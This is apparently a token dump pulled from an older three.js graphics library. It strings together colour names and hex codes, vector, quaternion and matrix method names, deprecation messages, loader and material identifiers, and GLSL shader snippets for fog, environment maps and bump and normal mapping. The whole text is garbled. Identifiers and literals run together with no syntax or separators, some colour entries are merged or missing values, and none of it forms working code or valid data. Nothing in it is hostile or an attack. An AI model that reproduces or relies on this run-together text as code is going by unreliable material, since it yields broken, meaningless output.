"0x4B0082"ivory"0xFFFFF0"khaki"0xF0E68C"lavender"0xE6E6FA"lavenderblush"0xFFF0F5"lawngreen"0x7CFC00"lemonchiffon"0xFFFACD"lightblue"0xADD8E6"lightcoral"0xF08080"lightcyan"0xE0FFFF"lightgoldenrodyellow"0xFAFAD2"lightgray"0xD3D3D3"lightgreen"0x90EE90"lightgrey""lightpink"0xFFB6C1"lightsalmon"0xFFA07A"lightseagreen"0x20B2AA"lightskyblue"0x87CEFA"lightslategray"0x778899"lightslategrey""lightsteelblue"0xB0C4DE"lightyellow"0xFFFFE0"lime"0x00FF00"limegreen"0x32CD32"linen"0xFAF0E6"magenta""maroon"0x800000"mediumaquamarine"0x66CDAA"mediumblue"0x0000CD"mediumorchid"0xBA55D3"mediumpurple"0x9370DB"mediumseagreen"0x3CB371"mediumslateblue"0x7B68EE"mediumspringgreen"0x00FA9A"mediumturquoise"0x48D1CC"mediumvioletred"0xC71585"midnightblue"0x191970"mintcream"0xF5FFFA"mistyrose"0xFFE4E1"moccasin"0xFFE4B5"navajowhite"0xFFDEAD"navy"0x000080"oldlace"0xFDF5E6"olive"0x808000"olivedrab"0x6B8E230xFFA500"orangered"0xFF4500"orchid"0xDA70D6"palegoldenrod"0xEEE8AA"palegreen"0x98FB98"paleturquoise"0xAFEEEE"palevioletred"0xDB7093"papayawhip"0xFFEFD5"peachpuff"0xFFDAB9"peru"0xCD853F"pink"0xFFC0CB"plum"0xDDA0DD"powderblue"0xB0E0E6"purple"0x800080"red"0xFF0000"rosybrown"0xBC8F8F"royalblue"0x4169E1"saddlebrown"0x8B4513"salmon"0xFA8072"sandybrown"0xF4A460"seagreen"0x2E8B57"seashell"0xFFF5EE"sienna"0xA0522D"silver"0xC0C0C0"skyblue"0x87CEEB"slateblue"0x6A5ACD"slategray"0x708090"slategrey""snow"0xFFFAFA"springgreen"0x00FF7F"steelblue"0x4682B4"tan"0xD2B48C"teal"0x008080"thistle"0xD8BFD8"tomato"0xFF6347"turquoise"0x40E0D0"violet"0xEE82EE"wheat"0xF5DEB3"white"0xFFFFFF"whitesmoke"0xF5F5F5"yellow"0xFFFF00"yellowgreen"0x9ACD32Quaternion_x_y_z_wonChangeCallbackquaternionsetFromEulereulerEuler'ERROR: Quaternion\'s .setFromEuler() now expects a Euler rotation rather than a Vector3 and order.  Please update your code.'c1c2c3s1s2s3'XYZ''YXZ''ZXY''ZYX''YZX''XZY'setFromAxisAnglehalfAnglesetFromRotationMatrix0.25setFromUnitVectorsvFromvTocrossVectorsconjugatelengthSq'DEPRECATED: Quaternion\'s .multiply() now only accepts one argument. Use .multiplyQuaternions( a, b ) instead.'multiplyQuaternionsqaxqayqazqawqbxqbyqbzqbwmultiplyVector3vector'DEPRECATED: Quaternion\'s .multiplyVector3() has been removed. Use is now vector.applyQuaternion( quaternion ) instead.'applyQuaternionslerpqbcosHalfThetahalfThetasinHalfThetaratioAratioBonChangeqaqmsetXsetYsetComponent"index is out of range: "getComponent'DEPRECATED: Vector2\'s .add() now only accepts one argument. Use .addVectors( a, b ) instead.'addVectors'DEPRECATED: Vector2\'s .sub() now only accepts one argument. Use .subVectors( a, b ) instead.'dividedivideScalarscalarinvScalarclampclampScalarminValmaxValroundToZeronegatedistanceToSquaredsetLengtholdLengthsetZ'DEPRECATED: Vector3\'s .add() now only accepts one argument. Use .addVectors( a, b ) instead.''DEPRECATED: Vector3\'s .sub() now only accepts one argument. Use .subVectors( a, b ) instead.''DEPRECATED: Vector3\'s .multiply() now only accepts one argument. Use .multiplyVectors( a, b ) instead.'multiplyVectorsapplyEuler'ERROR: Vector3\'s .applyEuler() now expects a Euler rotation rather than a Vector3 and order.  Please update your code.'applyAxisAngleapplyMatrix3applyMatrix4applyProjectionqxqyqzqwixiyiziwtransformDirectionlengthManhattancross'DEPRECATED: Vector3\'s .cross() now only accepts one argument. Use .crossVectors( a, b ) instead.'axayazbxbybzprojectOnVectorprojectOnPlaneplaneNormalreflectangleTodzsetEulerFromRotationMatrix"REMOVED: Vector3\'s setEulerFromRotationMatrix has been removed in favor of Euler.setFromRotationMatrix(), please update your code."setEulerFromQuaternion"REMOVED: Vector3\'s setEulerFromQuaternion: has been removed in favor of Euler.setFromQuaternion(), please update your code."getPositionFromMatrix"DEPRECATED: Vector3\'s .getPositionFromMatrix() has been renamed to .setFromMatrixPosition(). Please update your code."setFromMatrixPositiongetScaleFromMatrix"DEPRECATED: Vector3\'s .getScaleFromMatrix() has been renamed to .setFromMatrixScale(). Please update your code."setFromMatrixScalegetColumnFromMatrix"DEPRECATED: Vector3\'s .getColumnFromMatrix() has been renamed to .setFromMatrixColumn(). Please update your code."setFromMatrixColumnszmeVector4setW'DEPRECATED: Vector4\'s .add() now only accepts one argument. Use .addVectors( a, b ) instead.''DEPRECATED: Vector4\'s .sub() now only accepts one argument. Use .subVectors( a, b ) instead.'setAxisAngleFromQuaternion0.0001setAxisAngleFromRotationMatrixepsilon20.1yyzzxyxzyz0.707106781_orderDefaultOrderRotationOrders0.99999'WARNING: Euler.setFromRotationMatrix() given unsupported order: 'setFromQuaternionsqxsqysqzsqw'WARNING: Euler.setFromQuaternion() given unsupported order: 'reordernewOrderLine3distanceSqatclosestPointToPointParameterstartPstartEndpointclampToLinestartEnd2startEnd_startPclosestPointToPointBox2setFromPointsmakeEmptysetFromCenterAndSizehalfSizeboxexpandByPointexpandByVectorexpandByScalarcontainsPointcontainsBoxisIntersectionBoxclampPointdistanceToPointclampedPointintersectunionBox3addPointsetFromObjectupdateMatrixWorldtraversegeometryverticesmatrixWorldgetBoundingSphereSphereMatrix3n11n12n13n21n22n23n31n32n33identity'DEPRECATED: Matrix3\'s .multiplyVector3() has been removed. Use vector.applyMatrix3( matrix ) instead.'multiplyVector3Array'DEPRECATED: Matrix3\'s .multiplyVector3Array() has been renamed. Use matrix.applyToVector3Array( array ) instead.'applyToVector3ArrayjdeterminantgetInversethrowOnInvertibledet"Matrix3.getInverse(): can't invert matrix, determinant is 0"flattenToArrayOffsetgetNormalMatrixtransposeIntoArrayMatrix4n14n24n34n41n42n43n44extractPosition'DEPRECATED: Matrix4\'s .extractPosition() has been renamed to .copyPosition().'copyPositionextractRotationscaleXscaleYscaleZmakeRotationFromEuler'ERROR: Matrix\'s .makeRotationFromEuler() now expects a Euler rotation rather than a Vector3 and order.  Please update your code.'aeafbfcecfdfacadbcbdsetRotationFromQuaternion'DEPRECATED: Matrix4\'s .setRotationFromQuaternion() has been deprecated in favor of makeRotationFromQuaternion.  Please update your code.'makeRotationFromQuaternionz2wxwywzeyeup'DEPRECATED: Matrix4\'s .multiply() now only accepts one argument. Use .multiplyMatrices( a, b ) instead.'multiplyMatricesa11a12a13a14a21a22a23a24a31a32a33a34a41a42a43a44b11b12b13b14b21b22b23b24b31b32b33b34b41b42b43b44multiplyToArray'DEPRECATED: Matrix4\'s .multiplyVector3() has been removed. Use vector.applyMatrix4( matrix ) or vector.applyProjection( matrix ) instead.'multiplyVector4'DEPRECATED: Matrix4\'s .multiplyVector4() has been removed. Use vector.applyMatrix4( matrix ) instead.''DEPRECATED: Matrix4\'s .multiplyVector3Array() has been renamed. Use matrix.applyToVector3Array( array ) instead.'rotateAxis'DEPRECATED: Matrix4\'s .rotateAxis() has been removed. Use Vector3.transformDirection( matrix ) instead.'crossVector'DEPRECATED: Matrix4\'s .crossVector() has been removed. Use vector.applyMatrix4( matrix ) instead.'getPosition'DEPRECATED: Matrix4\'s .getPosition() has been removed. Use Vector3.setFromMatrixPosition( matrix ) instead.'setPosition"Matrix4.getInverse(): can't invert matrix, determinant is 0"'DEPRECATED: Matrix4\'s .translate() has been removed.'rotateX'DEPRECATED: Matrix4\'s .rotateX() has been removed.'rotateY'DEPRECATED: Matrix4\'s .rotateY() has been removed.'rotateZ'DEPRECATED: Matrix4\'s .rotateZ() has been removed.'rotateByAxis'DEPRECATED: Matrix4\'s .rotateByAxis() has been removed.'getMaxScaleOnAxisscaleXSqscaleYSqscaleZSqmakeTranslationmakeRotationXmakeRotationYmakeRotationZmakeRotationAxistymakeScalecomposedecomposeinvSXinvSYinvSZmakeFrustumnearfarmakePerspectiveaspectymaxdegToRadyminxminxmaxmakeOrthographicRayrayrecastdirectionDistancedistanceSqToSegmentv0optionalPointOnRayoptionalPointOnSegmentsegCentersegDirsegExtenta01b0b1s0sqrDistextDetinvDetisIntersectionSpheresphereisIntersectionPlaneplanedistToPointdenominatordistanceToPlaneconstantintersectPlaneintersectBoxtmintmaxtymintymaxtzmintzmaxinvdirxinvdiryinvdirzintersectTriangleedge1edge2backfaceCullingDdNDdQxE2DdE1xQQdNmatrix4optionalCentermaxRadiusSqintersectsSphereradiusSumdeltaLengthSqgetBoundingBoxFrustump0p1p2p3p4p5planesPlanefrustumsetFromMatrixme0me1me2me3me4me5me6me7me8me9me10me11me12me13me14me15setComponentsintersectsObjectboundingSpherecomputeBoundingSpherenegRadiusintersectsBoxd1d2setFromNormalAndCoplanarPointsetFromCoplanarPointsv2inverseNormalLengthdistanceToSphereprojectPointorthoPointperpendicularMagnitudeisIntersectionLinestartSignendSignintersectLinecoplanarPointm1optionalNormalMatrixnormalMatrixnewNormalnewCoplanarPointgenerateUUIDchars'0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'uuidrnd'4'0x20000000x10000000xf0x30x8clampBottommapLineara1a2b2smoothstepsmoothersteprandom166528065535randIntrandFloatrandFloatSpreaddegreeToRadiansFactordegreesradToDegradianToDegreesFactorradiansisPowerOfTwoSplinev3intPointw2w3papbpdinitFromArraygetPointinterpolategetControlPointsArraygetLengthnSubDivisionsnSamplesoldIntPointoldPositiontmpVecchunkLengthstotalLengthchunksreparametrizeByArcLengthsamplingCoefindexCurrentindexNextlinearDistancerealDistancesamplingnewpointsslt2t3TriangleresultLengthSqbarycoordFromPointdot00dot01dot02dot11dot12denominvDenomsetFromPointsAndIndicesi0i1i2triangleareamidpointVertex'THREE.Vertex has been DEPRECATED. Use THREE.Vector3 instead.'ClockautoStartoldTimerunninggetElapsedTimegetDeltanewTimehasEventListener_listenerslistenerArrayRaycasterlocalRayfacePlaneintersectPointmatrixPositioninverseMatrixdescSortvAvBvCintersectObjectraycasterintersectsSpriteLODgetObjectForDistanceboundingBoxBufferGeometryindicespositionsoffsetsoiolsideintersectionPointfaceIndexGeometryisFaceMaterialMeshFaceMaterialobjectMaterialsmaterialsflfacesmaterialIndexmorphTargetsmorphInfluencesmorphTargetInfluencestlinfluenceLinelinePrecisionprecisionSqnbVerticesinterSegmentinterRayLineStripdistSqintersectDescendantsdescendantsgetDescendantsintersectObjectsobjectsObject3DObject3DIdCountrenderDepthrotationAutoUpdatematrixAutoUpdatematrixWorldNeedsUpdatecastShadowreceiveShadowfrustumCulledeulerOrder'DEPRECATED: Object3D\'s .eulerOrder has been moved to Object3D\'s .rotation.order.'useQuaternion'DEPRECATED: Object3D\'s .useQuaternion has been removed. The library now uses quaternions by default.'applyMatrixsetRotationFromAxisAnglesetRotationFromEulersetRotationFromMatrixrotateOnAxisq1translateOnAxis'DEPRECATED: Object3D\'s .translate() has been removed. Use .translateOnAxis( axis, distance ) instead. Note args have been changed.'translateXtranslateYtranslateZlocalToWorldworldToLocal'THREE.Object3D.add: An object can\'t be added as a child of itself.''added'while__addObject'removed'__removeObjectgetObjectByIdchildgetObjectByNamegetChildByName'DEPRECATED: Object3D\'s .getChildByName() has been renamed to .getObjectByName().'updateMatrixProjector_object_objectCount_objectPool_objectPoolLength_vertex_vertexCount_vertexPool_vertexPoolLength_face_faceCount_facePool_facePoolLength_line_lineCount_linePool_linePoolLength_sprite_spriteCount_spritePool_spritePoolLength_renderDatalights_vA_vB_vC_vector3_vector4_clipBox_boundingBox_points3_points4_viewMatrix_viewProjectionMatrix_modelMatrix_modelViewProjectionMatrix_normalMatrix_frustum_clippedVertex1PositionScreen_clippedVertex2PositionScreenprojectVectormatrixWorldInverseprojectionMatrixunprojectVectorprojectionMatrixInversepickingRayprojectObjectLightgetNextObjectInPoolprojectGraphsortObjectspainterSortRenderListnormalsuvssetObjectprojectVertexvertexpositionWorldpositionScreeninvWpushVertexgetNextVertexInPoolpushNormalpushUvcheckTriangleVisibilitycheckBackfaceCullingpushLinegetNextLineInPoolpushTrianglegetNextFaceInPoolvertexNormalsModeloffset2vertexNormalsLengthrenderListprojectScenesortElementsfaceVertexNormalsfaceVertexUvsautoUpdatevlv1pv2pv3pnormalModelvertexNormalsnlvertexUvsLinePiecesclipLinevertexColorsgetNextSpriteInPoolRenderableObjectRenderableVertexRenderableFaceRenderableLinespriteRenderableSpritealpha1alpha2bc1nearbc2nearbc1farbc2farFace3vertexTangentsFace4'THREE.Face4 has been removed. A THREE.Face3 will be created instead.'BufferAttributeitemSizesetXYsetXYZsetXYZWInt8AttributeUint8AttributeUint8ClampedAttributeInt16AttributeUint16AttributeInt32AttributeUint32AttributeFloat32AttributeFloat64AttributeGeometryIdCountdrawcallsaddAttributeattribute'DEPRECATED: BufferGeometry\'s addAttribute() now expects ( name, attribute ).'addDrawCallindexOffsetneedsUpdatecomputeBoundingBox"position"bbcomputeFaceNormalscomputeVertexNormalsjlnVertexElements"normal"pApBpCab"index"normalizeNormalsnormalsNeedUpdatecomputeTangents"uv""Missing required attributes (index, position, normal or uv) in BufferGeometry.computeTangents()"nVertices"tangent"nTangentElementstangentstan1tan2xAyAzAxByBzBxCyCzCuAuBuCz1t1sdirtdirhandleTriangleiAiBiCtmp2n2handleVertex0.0computeOffsetsindexBufferSize'index''position'verticesCountfacesCountsortedIndicesindexPtrvertexPtrduplicatedVerticesnewVerticeMapsfaceVerticesvertexMaprevVertexMapfindexvovidfaceMaxnew_offsetnew_vidreorderBuffers'BufferGeometry.merge(): TODO'indexBufferindexMapvertexCountsortedAttributesinsourceArrayattrArrayattrSizesortedAttrnumItemssourceAttr'dispose'morphColorsmorphNormalsskinWeightsskinIndiceslineDistanceshasTangentsdynamicverticesNeedUpdateelementsNeedUpdateuvsNeedUpdatetangentsNeedUpdatecolorsNeedUpdatelineDistancesNeedUpdatebuffersNeedUpdateareaWeightedvDdccomputeMorphNormals__originalFaceNormal__originalVertexNormalstmpGeofaceNormalsdstNormalsFacedstNormalsVertexfaceNormalvertexIndexuvAuvBuvCuaubuc'b''c''d'computeLineDistancesmaterialIndexOffset'THREE.Geometry.merge(): geometry not an instance of THREE.Geometry.'vertexOffsetuvPositionvertices1vertices2faces1faces2uvs1uvs2vertexCopyfaceCopyfaceVertexColorsuvCopymergeVerticesverticesMapprecisionPointsfaceIndicesToRemovedupIndex--idxmakeGroupsgeometryGroupCounterusesFaceMaterialmaxVerticesInGroupgroupHashhash_mapnumMorphTargetsnumMorphNormalsgeometryGroups'hash''counter'counter'faces3''materialIndex''vertices''numMorphTargets''numMorphNormals'faces3geometryGroupsListCamera2000updateProjectionMatrixPerspectiveCamerasetLensfocalLengthframeHeightsetViewOffsetfullWidthfullHeightlightAmbientLightAreaLightintensityconstantAttenuation1.5linearAttenuationquadraticAttenuationDirectionalLightonlyShadowshadowCameraNearshadowCameraFarshadowCameraLeftshadowCameraRightshadowCameraTopshadowCameraBottomshadowCameraVisibleshadowBiasshadowDarknessshadowMapWidth512shadowMapHeightshadowCascadeshadowCascadeOffsetshadowCascadeCountshadowCascadeBiasshadowCascadeWidthshadowCascadeHeightshadowCascadeNearZ1.0000.9900.998shadowCascadeFarZshadowCascadeArrayshadowMapshadowMapSizeshadowCamerashadowMatrixHemisphereLightskyColorgroundColorPointLightSpotLightexponentshadowCameraFovLoadershowStatusstatusDomElementaddStatusElementimageLoaderImageLoaderonLoadStartonLoadProgressonLoadComplete"div""absolute""0px""0.8em""left""rgba(0,0,0,0.25)""#fff""120px""0.5em 0.5em 0.5em 0.5em""Loading ..."updateProgress"Loaded ""%"1024" KB"extractUrlBaseparts'./'initMaterialstexturePathcreateMaterialneedsTangentsnearest_pow2create_texturesourceFileanisotropyisCompressed/\.dds$/iImageUtilsloadCompressedTexture'canvas'TexturewrapSwrapTwrapMap"repeat""mirror"'2d'rgb2hexrgbmtype"MeshLambertMaterial"mpars0xeeeeeelightMapnormalMapbumpMapwireframeshading"phong""MeshPhongMaterial""basic""MeshBasicMaterial"blendingtransparentdepthTestdepthWriteflipSideddoubleSided"face"colorDiffuseDbgColorcolorSpecularspecularcolorAmbientambientcolorEmissiveemissivetransparencyspecularCoefshininessmapDiffuse"map"mapDiffuseRepeatmapDiffuseOffsetmapDiffuseWrapmapDiffuseAnisotropymapLight"lightMap"mapLightRepeatmapLightOffsetmapLightWrapmapLightAnisotropymapBump"bumpMap"mapBumpRepeatmapBumpOffsetmapBumpWrapmapBumpAnisotropymapNormal"normalMap"mapNormalRepeatmapNormalOffsetmapNormalWrapmapNormalAnisotropymapSpecular"specularMap"mapSpecularRepeatmapSpecularOffsetmapSpecularWrapmapSpecularAnisotropymapBumpScalebumpScaleShaderLib"normalmap""tNormal"mapNormalFactor"uNormalScale""enableDiffuse"specularMap"tSpecular""enableSpecular""tAO""enableAO""diffuse""specular""ambient""shininess"fogDbgNameXHRLoadermanagerDefaultLoadingManageronLoadonProgressonErrorcacheditemEnd'progress'itemStartsetCrossOrigin'img'JSONLoader"string"loadAjaxJSONcallbackProgressmetadata'scene''THREE.JSONLoader: "''" seems to be a Scene. Use THREE.SceneLoader instead.''" seems to be unreachable or the file is empty.''THREE.JSONLoader: Couldn\'t load "''" (''Content-Length'"Content-Length""GET"parseModelparseSkinparseMorphingisBitSetfizLengthcolorIndexnormalIndexuvIndexisQuadhasMaterialhasFaceVertexUvhasFaceNormalhasFaceVertexNormalhasFaceColorhasFaceVertexColorfaceAfaceBuvLayernUvLayersinfluencesPerVertexbones'When skinning, number of vertices (''), skinIndices (''), and skinWeights ('') should match.'animationanimationsdstVerticessrcVerticescldstColorssrcColors0xffaa00LoadingManagerBufferGeometryLoaderMaterialLoaderObjectLoadergeometriesparseGeometriesparseMaterialsparseObjectgeometryLoaderbufferGeometryLoader'PlaneGeometry'widthSegmentsheightSegments'BoxGeometry''CubeGeometry'BoxGeometrydepthSegments'CircleGeometry'CircleGeometry'CylinderGeometry'CylinderGeometryradiusTopradiusBottomradialSegmentsopenEnded'SphereGeometry'SphereGeometryphiStartphiLengththetaStartthetaLength'IcosahedronGeometry'IcosahedronGeometry'TorusGeometry'TorusGeometrytubetubularSegments'TorusKnotGeometry'TorusKnotGeometryheightScale'BufferGeometry''Geometry''Scene''PerspectiveCamera''OrthographicCamera''AmbientLight''DirectionalLight''PointLight''SpotLight''HemisphereLight''Mesh''THREE.ObjectLoader: Undefined geometry ''THREE.ObjectLoader: Undefined material ''Sprite'SceneLoadercallbackSyncgeometryHandlershierarchyHandlersaddGeometryHandler"ascii"typeIDloaderClass"loaderClass"addHierarchyHandlercallbackFinishedurlBasecounter_modelscounter_texturestotal_modelstotal_texturestarget_array"loaderObject"face_materialstexturescamerasfogsemptiesgroupsget_urlsource_urlurl_type"relativeToHTML"handle_objectshandle_childrenmatdstposrotsclquatobjIDobjJSONloadingreservedTypes"type""url""material""rotation""scale""visible""children""userData""skin""morph""mirroredLoop""duration"loaderParametersparTypeurlBaseTypecreate_callback_hierachyskinSkinnedMeshmorphMorphAnimMeshmirroredLoop"AmbientLight""PointLight""DirectionalLight""SpotLight""HemisphereLight""AreaLight"'AreaLight'size_y"PerspectiveCamera""OrthographicCamera"groupIDhandle_meshgeohandle_hierarchycreate_callback_geometryasync_callback_gatedaecreate_callback_embedtotalModelstotalTexturesloadedModelsloadedTexturesfinalizetatargetNametargetInversecallbackTexturegenerateTextureCallbacktraverse_json_hierarchyobjChildIDfogIDfogJSON"linear"Fog"exp2"FogExp2densitygeoIDgeoJSON"cube""plane""sphere""cylinder"topRadbotRadradSegsheightSegs"torus"segmentsRsegmentsT"icosahedron"subdivisions"embedded"modelJsontexture_pathjsonLoadertextureJSONurl_arrayloadCompressedTextureCubeloadTextureCubefullUrltextureCallbackloadTexturematIDmatJSONparID"envMap""shading""flat""side""double""back""blending""combine""vertexColors""wrapRGB"diffusenormalScaleenvMap"tCube""enableReflection""reflectivity"reflectivitydisplacementMap"tDisplacement""enableDisplacement""uDisplacementBias"displacementBias"uDisplacementScale"displacementScalematerialArraydefaultscurrentCameraTextureLoaderMaterialMaterialIdCountblendSrcblendDstpolygonOffsetFactorpolygonOffsetUnitsalphaTestoverdrawsetValues'THREE.Material: \'''\' parameter is undefined.''overdraw'LineBasicMaterial0xfffffflinewidthlinecap'round'linejoinLineDashedMaterialdashSizegapSizeMeshBasicMaterialcombinerefractionRatio0.98wireframeLinewidthwireframeLinecapwireframeLinejoinskinningMeshLambertMaterialwrapAroundwrapRGBMeshPhongMaterial0x111111metalMeshDepthMaterialMeshNormalMaterialParticleSystemMaterialsizeAttenuationParticleBasicMaterial"void main() {}"defaultAttributeValues"color""uv2"index0AttributeNameRawShaderMaterialSpriteMaterialSpriteCanvasMaterialParticleCanvasMaterialTextureIdCountmipmapsgenerateMipmapspremultiplyAlphaflipYunpackAlignment_needsUpdateonUpdate'update'CompressedTextureDataTextureParticleSystemsortParticlesupdateMorphTargetsmorphTargetBasemorphTargetForcedOrdermorphTargetDictionarymlgetMorphTargetIndexByName"THREE.Mesh.getMorphTargetIndexByName: morph target "" does not exist. Returning 0."BonebelongsToSkinskinMatrixaccumulatedRotWeightaccumulatedPosWeightaccumulatedSclWeightparentSkinMatrixforceUpdate|=SkeletonboneListuseVertexTextureboneMatricesbonegbonerotqaddBonenBones25664boneTextureWidthboneTextureHeightboneTexturecalculateInversesboneInversesblskeletonidentityMatrixposeoffsetMatrixnormalizeSkinWeightslastKeyframecurrentKeyframedirectionBackwardssetFrameRangestartKeyframeendKeyframesetDirectionForwardsetDirectionBackwardparseAnimationsfirstAnimation/([a-z]+)_?(\d+)/setAnimationLabelplayAnimationfps"animation[""] undefined"updateAnimationframeTimekeyframemixaddLevelParticle__lights__objectsAdded__objectsRemoved'objectAdded''addedToScene''objectRemoved''removedFromScene'0.00025CanvasRenderer'THREE.CanvasRenderer'_this_elements_lights_projector_canvas_canvasWidth_canvasHeight_canvasWidthHalf_canvasHeightHalf_context_clearColor_clearAlpha_contextGlobalAlpha_contextGlobalCompositeOperation_contextStrokeStyle_contextFillStyle_contextLineWidth_contextLineCap_contextLineJoin_contextDashSize_contextGapSize_camera_v1_v2_v3_v4_v5_v6_v1x_v1y_v2x_v2y_v3x_v3y_v4x_v4y_v5x_v5y_v6x_v6y_color_color1_color2_color3_color4_diffuseColor_emissiveColor_lightColor_patterns_image_uvs_uv1x_uv1y_uv2x_uv2y_uv3x_uv3y_clearBox_elemBox_ambientLight_directionalLights_pointLights_centroid_normal_normalViewMatrixautoClearsupportsVertexTexturessetFaceCullingupdateStyle'px'setViewportviewportXviewportYviewportWidthviewportHeightsetScissorenableScissorTestsetClearColorHex'DEPRECATED: .setClearColorHex() is being removed. Use .setClearColor() instead.'getMaxAnisotropysetBlendingsetOpacitysetFillStyle'rgba(''THREE.CanvasRenderer.render: camera is not an instance of THREE.Camera.'calculateLightselrenderSpriterenderLinerenderFace3lllightColorcalculateLightlightPositiondistonTextureUpdatetextureToPattern'rgba( 0, 0, 0, 1 )'bitmapoxoycxcysetStrokeStylesetLineWidthsetLineCapsetLineJoincolorStyle1colorStyle2gradsetDashAndGapuv1uv2uv3drawTrianglestrokePathfillPathpatternPathrepeatXrepeatY'repeat''repeat-x''repeat-y''no-repeat'u0u1u2'rgba(0,0,0,1)'idetclipImage'source-over''lighter''darker'dashSizeValuegapSizeValueShaderChunkfog_pars_fragment"#ifdef USE_FOG""	uniform vec3 fogColor;""	#ifdef FOG_EXP2""		uniform float fogDensity;""	#else""		uniform float fogNear;""		uniform float fogFar;""	#endif""#endif"fog_fragment"	#ifdef USE_LOGDEPTHBUF_EXT""		float depth = gl_FragDepthEXT / gl_FragCoord.w;""		float depth = gl_FragCoord.z / gl_FragCoord.w;""		const float LOG2 = 1.442695;""		float fogFactor = exp2( - fogDensity * fogDensity * depth * depth * LOG2 );""		fogFactor = 1.0 - clamp( fogFactor, 0.0, 1.0 );""		float fogFactor = smoothstep( fogNear, fogFar, depth );""	gl_FragColor = mix( gl_FragColor, vec4( fogColor, gl_FragColor.w ), fogFactor );"envmap_pars_fragment"#ifdef USE_ENVMAP""	uniform float reflectivity;""	uniform samplerCube envMap;""	uniform float flipEnvMap;""	uniform int combine;""	#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP )""		uniform bool useRefract;""		uniform float refractionRatio;""		varying vec3 vReflect;"envmap_fragment"	vec3 reflectVec;""		vec3 cameraToVertex = normalize( vWorldPosition - cameraPosition );""		vec3 worldNormal = normalize( vec3( vec4( normal, 0.0 ) * viewMatrix ) );""		if ( useRefract ) {""			reflectVec = refract( cameraToVertex, worldNormal, refractionRatio );""		} else { ""			reflectVec = reflect( cameraToVertex, worldNormal );""		}""		reflectVec = vReflect;""	#ifdef DOUBLE_SIDED""		float flipNormal = ( -1.0 + 2.0 * float( gl_FrontFacing ) );""		vec4 cubeColor = textureCube( envMap, flipNormal * vec3( flipEnvMap * reflectVec.x, reflectVec.yz ) );""		vec4 cubeColor = textureCube( envMap, vec3( flipEnvMap * reflectVec.x, reflectVec.yz ) );""	#ifdef GAMMA_INPUT""		cubeColor.xyz *= cubeColor.xyz;""	if ( combine == 1 ) {""		gl_FragColor.xyz = mix( gl_FragColor.xyz, cubeColor.xyz, specularStrength * reflectivity );""	} else if ( combine == 2 ) {""		gl_FragColor.xyz += cubeColor.xyz * specularStrength * reflectivity;""	} else {""		gl_FragColor.xyz = mix( gl_FragColor.xyz, gl_FragColor.xyz * cubeColor.xyz, specularStrength * reflectivity );""	}"envmap_pars_vertex"#if defined( USE_ENVMAP ) && ! defined( USE_BUMPMAP ) && ! defined( USE_NORMALMAP )""	varying vec3 vReflect;""	uniform float refractionRatio;""	uniform bool useRefract;"worldpos_vertex"#if defined( USE_ENVMAP ) || defined( PHONG ) || defined( LAMBERT ) || defined ( USE_SHADOWMAP )""	#ifdef USE_SKINNING""		vec4 worldPosition = modelMatrix * skinned;""	#if defined( USE_MORPHTARGETS ) && ! defined( USE_SKINNING )""		vec4 worldPosition = modelMatrix * vec4( morphed, 1.0 );""	#if ! defined( USE_MORPHTARGETS ) && ! defined( USE_SKINNING )""		vec4 worldPosition = modelMatrix * vec4( position, 1.0 );"envmap_vertex"	vec3 worldNormal = mat3( modelMatrix[ 0 ].xyz, modelMatrix[ 1 ].xyz, modelMatrix[ 2 ].xyz ) * objectNormal;""	worldNormal = normalize( worldNormal );""	vec3 cameraToVertex = normalize( worldPosition.xyz - cameraPosition );""	if ( useRefract ) {""		vReflect = refract( cameraToVertex, worldNormal, refractionRatio );""		vReflect = reflect( cameraToVertex, worldNormal );"map_particle_pars_fragment"#ifdef USE_MAP""	uniform sampler2D map;"map_particle_fragment"	gl_FragColor = gl_FragColor * texture2D( map, vec2( gl_PointCoord.x, 1.0 - gl_PointCoord.y ) );"map_pars_vertex"#if defined( USE_MAP ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( USE_SPECULARMAP )""	varying vec2 vUv;""	uniform vec4 offsetRepeat;"map_pars_fragmentmap_vertex"	vUv = uv * offsetRepeat.zw + offsetRepeat.xy;"map_fragment"	vec4 texelColor = texture2D( map, vUv );""		texelColor.xyz *= texelColor.xyz;""	gl_FragColor = gl_FragColor * texelColor;"lightmap_pars_fragment"#ifdef USE_LIGHTMAP""	varying vec2 vUv2;""	uniform sampler2D lightMap;"lightmap_pars_vertexlightmap_fragment"	gl_FragColor = gl_FragColor * texture2D( lightMap, vUv2 );"lightmap_vertex"	vUv2 = uv2;"bumpmap_pars_fragment"#ifdef USE_BUMPMAP""	uniform sampler2D bumpMap;""	uniform float bumpScale;""	vec2 dHdxy_fwd() {""		vec2 dSTdx = dFdx( vUv );""		vec2 dSTdy = dFdy( vUv );""		float Hll = bumpScale * texture2D( bumpMap, vUv ).x;""		float dBx = bumpScale * texture2D( bumpMap, vUv + dSTdx ).x - Hll;""		float dBy = bumpScale * texture2D( bumpMap, vUv + dSTdy ).x - Hll;""		return vec2( dBx, dBy );""	vec3 perturbNormalArb( vec3 surf_pos, vec3 surf_norm, vec2 dHdxy ) {""		vec3 vSigmaX = dFdx( surf_pos );""		vec3 vSigmaY = dFdy( surf_pos );""		vec3 vN = surf_norm;""		vec3 R1 = cross( vSigmaY, vN );""		vec3 R2 = cross( vN, vSigmaX );""		float fDet = dot( vSigmaX, R1 );""		vec3 vGrad = sign( fDet ) * ( dHdxy.x * R1 + dHdxy.y * R2 );""		return normalize( abs( fDet ) * surf_norm - vGrad );"normalmap_pars_fragment"#ifdef USE_NORMALMAP""	uniform sampler2D normalMap;""	uniform vec2 normalScale;""	vec3 perturbNormal2Arb( vec3 eye_pos, vec3 surf_norm ) {""		vec3 q0 = dFdx( eye_pos.xyz );""		vec3 q1 = dFdy( eye_pos.xyz );""		vec2 st0 = dFdx( vUv.st );""		vec2 st1 = dFdy( vUv.st );""		vec3 S = normalize(  q0 * st1.t - q1 * st0.t );""		vec3 T = normalize( -q0 * st1.s + q1 * st0.s );""		vec3 N = normalize( surf_norm );""		vec3 mapN = texture2D( normalMap, vUv ).xyz * 2.0 - 1.0;""		mapN.xy = normalScale * mapN.xy;""		mat3 tsn = mat3( S, T, N );""		return normalize( tsn * mapN );"specularmap_pars_fragment"#ifdef USE_SPECULARMAP""	uniform sampler2D specularMap;"specularmap_fragment"float specularStrength;""	vec4 texelSpecular = texture2D( specularMap, vUv );""	specularStrength = texelSpecular.r;""#else""	specularStrength = 1.0;"lights_lambert_pars_vertex"uniform vec3 ambient;""uniform vec3 diffuse;""uniform 